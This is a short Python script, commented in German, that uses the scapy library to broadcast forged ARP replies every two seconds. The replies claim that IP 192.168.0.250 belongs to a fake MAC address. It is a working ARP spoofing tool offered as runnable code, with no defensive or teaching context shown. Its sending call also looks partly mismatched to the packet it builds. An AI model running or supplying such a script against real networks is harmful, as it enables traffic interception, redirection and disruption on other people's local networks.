from scapy.all import ARP, Ether, send, conf
import time

# IP, die wir "spoofen" wollen
spoofed_ip = "192.168.0.250"
fake_mac = "AA:BB:CC:DD:EE:FF" 

# Ether() baut den Ethernet-Header (Broadcast: ff:ff:ff:ff:ff:ff)
# ARP() baut den ARP-Header
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, 
    pdst="192.168.0.255", 
    psrc=spoofed_ip, 
    hwdst="00:00:00:00:00:00", 
    hwsrc=fake_mac
)

print(f"Sende ARP-Spoof für {spoofed_ip} mit Fake-MAC {fake_mac}...")

try:
    while True:
        send(packet, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nStop.")